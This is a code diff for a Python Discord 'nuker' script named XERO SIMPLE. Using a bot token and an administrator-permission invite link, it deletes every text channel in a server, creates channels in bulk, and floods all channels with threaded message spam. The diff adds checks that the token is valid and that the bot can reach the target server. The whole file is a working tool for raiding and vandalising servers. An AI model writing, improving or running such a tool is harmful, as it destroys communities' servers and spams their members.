@@ -2,7 +2,6 @@
 import os
 import sys
 import time
-import json
 import threading
 
 try:
@@ -16,7 +15,6 @@ os.system("clear")
 print("""
 ====================================
     XERO SIMPLE - iSH EDITION
-       JUST WHAT YOU NEED
 ====================================
 """)
 
@@ -25,40 +23,74 @@ if not token:
     print("[!] Token required!")
     sys.exit(1)
 
+# فحص التوكن
+print("[...] Checking token...")
+try:
+    r = requests.get(
+        "https://discord.com/api/v10/users/@me",
+        headers={"Authorization": f"Bot {token}"},
+        timeout=15
+    )
+    if r.status_code == 200:
+        info = r.json()
+        print(f"[+] Connected as: {info['username']}")
+        print("[+] Token is valid!\n")
+        time.sleep(1)
+    else:
+        print(f"[-] Invalid token! Status: {r.status_code}")
+        sys.exit(1)
+except Exception as e:
+    print(f"[-] Connection error: {e}")
+    print("[-] Check your internet connection!")
+    sys.exit(1)
+
+# ==================== الأداة نفسها ====================
 class XeroSimple:
     def __init__(self, guild_id, token):
         self.guild_id = guild_id
         self.token = token
         self.spamming = False
         self.spam_count = 0
-        self.spam_threads = []
         self.headers = {"Authorization": f"Bot {self.token}"}
 
-    def api_get(self, url):
+    def api_call(self, method, url, data=None):
         try:
-            r = requests.get(url, headers=self.headers, timeout=10)
-            return r
-        except:
+            if method == "get":
+                return requests.get(url, headers=self.headers, timeout=15)
+            elif method == "post":
+                return requests.post(url, headers=self.headers, json=data, timeout=15)
+            elif method == "delete":
+                return requests.delete(url, headers=self.headers, timeout=15)
+        except Exception as e:
+            print(f"[-] Error: {e}")
             return None
 
-    def api_post(self, url, data=None):
-        try:
-            r = requests.post(url, headers=self.headers, json=data, timeout=10)
-            return r
-        except:
-            return None
-
-    def api_delete(self, url):
-        try:
-            r = requests.delete(url, headers=self.headers, timeout=10)
-            return r
-        except:
-            return None
+    def check_guild(self):
+        """يتأكد إن البوت يقدر يدخل السيرفر"""
+        print(f"[...] Checking guild {self.guild_id}...")
+        r = self.api_call("get", f"https://discord.com/api/v10/guilds/{self.guild_id}")
+        if r and r.status_code == 200:
+            guild = r.json()
+            print(f"[+] Guild found: {guild['name']}")
+            return True
+        elif r and r.status_code == 403:
+            print("[-] Bot is NOT in this guild!")
+            print("[-] Add the bot to the guild first!")
+            return False
+        elif r and r.status_code == 404:
+            print("[-] Guild not found!")
+            return False
+        else:
+            print("[-] Cannot access guild!")
+            return False
 
     def get_all_channels(self):
-        r = self.api_get(f"https://discord.com/api/v10/guilds/{self.guild_id}/channels")
+        r = self.api_call("get", f"https://discord.com/api/v10/guilds/{self.guild_id}/channels")
         if r and r.status_code == 200:
-            return [c for c in r.json() if c['type'] == 0]
+            channels = r.json()
+            text_channels = [c for c in channels if c['type'] == 0]
+            print(f"[+] Found {len(text_channels)} text channels")
+            return text_channels
         return []
 
     def delete_all_channels(self):
@@ -71,20 +103,21 @@ class XeroSimple:
         
         deleted = 0
         for i, channel in enumerate(channels, 1):
-            r = self.api_delete(f"https://discord.com/api/v10/channels/{channel['id']}")
+            r = self.api_call("delete", f"https://discord.com/api/v10/channels/{channel['id']}")
             if r and r.status_code == 200:
                 deleted += 1
                 print(f"[+] Deleted: {channel['name']} ({i}/{len(channels)})")
             else:
                 print(f"[-] Failed: {channel['name']}")
-            time.sleep(0.3)
+            time.sleep(0.5)
         
         print(f"\n[+] Deleted {deleted}/{len(channels)}")
 
     def spam_single_channel(self, channel_id, message):
         while self.spamming:
             try:
-                r = self.api_post(
+                r = self.api_call(
+                    "post",
                     f"https://discord.com/api/v10/channels/{channel_id}/messages",
                     data={"content": message}
                 )
@@ -106,12 +139,10 @@ class XeroSimple:
         print(f"\n[!] Spamming {len(channels)} channels...")
         print("[!] PRESS ENTER TO STOP\n")
         
-        self.spam_threads = []
         for channel in channels:
             t = threading.Thread(target=self.spam_single_channel, args=(channel['id'], message))
             t.daemon = True
             t.start()
-            self.spam_threads.append(t)
 
     def start_spam(self, message):
         if self.spamming:
@@ -134,13 +165,16 @@ class XeroSimple:
         created = 0
         for i in range(amount):
             channel_name = f"{name}-{i+1}" if amount > 1 else name
-            r = self.api_post(
+            r = self.api_call(
+                "post",
                 f"https://discord.com/api/v10/guilds/{self.guild_id}/channels",
                 data={"name": channel_name, "type": 0}
             )
             if r and r.status_code == 201:
                 created += 1
                 print(f"[+] {created}/{amount}: {channel_name}")
+                if created >= amount:
+                    break
             else:
                 print(f"[-] Failed: {channel_name}")
             time.sleep(0.5)
@@ -148,7 +182,7 @@ class XeroSimple:
         print(f"\n[+] Created {created}/{amount}")
 
     def get_invite(self):
-        r = self.api_get("https://discord.com/api/v10/oauth2/applications/@me")
+        r = self.api_call("get", "https://discord.com/api/v10/oauth2/applications/@me")
         if r and r.status_code == 200:
             cid = r.json()['id']
             return f"https://discord.com/oauth2/authorize?client_id={cid}&permissions=8&scope=bot"
@@ -199,9 +233,9 @@ class XeroSimple:
             elif choice == "4":
                 invite = self.get_invite()
                 if invite:
-                    print(f"\n[+] INVITE LINK: {invite}")
+                    print(f"\n[+] {invite}")
                 else:
-                    print("\n[-] Failed to get invite link")
+                    print("\n[-] Failed!")
                 input("\n[PRESS ENTER]")
                 
             elif choice == "5":
@@ -211,34 +245,32 @@ class XeroSimple:
                 print("[!] BYE!")
                 return "exit"
 
-# تشغيل
-os.system("clear")
-
-try:
-    r = requests.get(
-        "https://discord.com/api/v10/users/@me",
-        headers={"Authorization": f"Bot {token}"},
-        timeout=10
-    )
-    if r.status_code == 200:
-        info = r.json()
-        print(f"[+] Connected as: {info['username']}\n")
-    else:
-        print("[-] Invalid token!")
-        sys.exit(1)
-except:
-    print("[-] No internet or API blocked!")
-    sys.exit(1)
+# ==================== حلقة التشغيل ====================
+print("[!] Ready!\n")
 
 while True:
     guild_id = input("[?] GUILD ID (or exit): ").strip()
+    
     if guild_id.lower() == 'exit':
+        print("[!] Goodbye!")
         sys.exit(0)
+    
     if not guild_id.isdigit():
-        print("[-] Invalid guild ID!")
+        print("[-] Invalid guild ID! Numbers only.\n")
         continue
     
+    print("")
     xero = XeroSimple(guild_id, token)
-    result = xero.menu()
-    if result == "exit":
-        sys.exit(0)
+    
+    if xero.check_guild():
+        print("[+] Starting menu...\n")
+        time.sleep(1)
+        result = xero.menu()
+        if result == "exit":
+            sys.exit(0)
+    else:
+        print("\n[!] Add bot to guild first!")
+        invite = xero.get_invite()
+        if invite:
+            print(f"[+] Invite link: {invite}")
+        print("")
